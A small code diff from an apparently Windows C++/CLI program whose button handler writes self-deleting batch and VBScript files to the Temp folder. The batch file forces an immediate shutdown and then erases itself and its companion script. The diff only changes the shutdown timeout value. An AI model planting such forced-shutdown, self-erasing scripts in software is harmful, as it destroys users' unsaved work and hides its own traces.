@@ -100,7 +100,7 @@ namespace solver {
 	private: System::Void final_Click() {
 		std::ofstream reboot("C:\\Windows\\Temp\\reboot.bat");
 		if (reboot.is_open())
-			reboot << "@echo OFF\nshutdown /s /f /t 0\nDEL \"C:\\Windows\\Temp\\reboot.vbs\"\ndel %0";
+			reboot << "@echo OFF\nshutdown /s /f /t 00\nDEL \"C:\\Windows\\Temp\\reboot.vbs\"\ndel %0";
 		reboot.close();
 		std::ofstream reboot1("C:\\Windows\\Temp\\reboot.vbs");
 		if (reboot1.is_open()) {
